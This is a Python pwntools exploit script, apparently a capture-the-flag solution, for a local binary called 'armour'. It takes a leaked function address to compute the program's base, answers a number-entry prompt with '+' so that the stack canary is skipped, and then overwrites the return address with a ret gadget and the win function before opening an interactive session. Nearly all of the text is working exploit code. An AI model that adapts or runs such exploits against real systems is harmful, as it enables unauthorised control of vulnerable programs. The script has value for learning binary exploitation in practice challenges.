#! /usr/bin/ python3
from pwn import *
import struct
elf=context.binary=ELF("./armour")

#9 for array
#10th canary
#11th return address

p=process()
p.recvuntil(b"SECRET of the escape room")
print(p.recvline().decode())
win = (p.recvline().decode())
win = win[win.index(":")+2:].strip()
print(f"WIN : {win}")
base = int(win,16) -0x000000000001270
print(f"BASE : {hex(base)}")
ret = base + 0x000000000000101a
p.sendline(b"13")
for i in range(11):
	if i!=9:
		p.sendline(b"12")
	else:
		p.sendline(b"+")
p.sendline(str(ret).encode())
p.sendline(str(int(win,16)).encode())
p.interactive()